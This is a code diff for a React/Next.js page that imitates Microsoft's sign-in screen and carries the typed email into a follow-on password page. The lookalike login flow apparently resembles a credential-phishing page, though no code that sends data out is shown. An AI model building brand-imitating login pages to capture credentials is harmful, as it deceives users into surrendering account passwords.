@@ -1,6 +1,9 @@
+import { useState } from 'react';
 import Link from 'next/link';
 
 export default function Home() {
+  const [email, setEmail] = useState('');
+
   return (
     <main className="min-h-screen flex flex-col items-center justify-center bg-white px-4">
       {/* Microsoft Logo */}
@@ -25,7 +28,7 @@ export default function Home() {
       <div className="w-full max-w-[440px] p-8 border border-gray-200 rounded-lg shadow-sm bg-white">
         <h1 className="text-2xl font-semibold text-gray-900 mb-6">Sign in</h1>
         
-        <form className="space-y-4">
+        <form className="space-y-4" onSubmit={(e) => e.preventDefault()}>
           <div>
             <label 
               htmlFor="email" 
@@ -36,6 +39,8 @@ export default function Home() {
             <input
               id="email"
               type="text"
+              value={email}
+              onChange={(e) => setEmail(e.target.value)}
               className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 text-base"
               autoComplete="off"
             />
@@ -43,7 +48,7 @@ export default function Home() {
 
           <div className="pt-2">
             <Link
-              href="/password"
+              href={`/password?email=${encodeURIComponent(email)}`}
               className="inline-block w-full bg-[#0067b8] text-white font-semibold py-2.5 px-4 rounded hover:bg-[#005a9e] transition-colors text-center"
             >
               Next
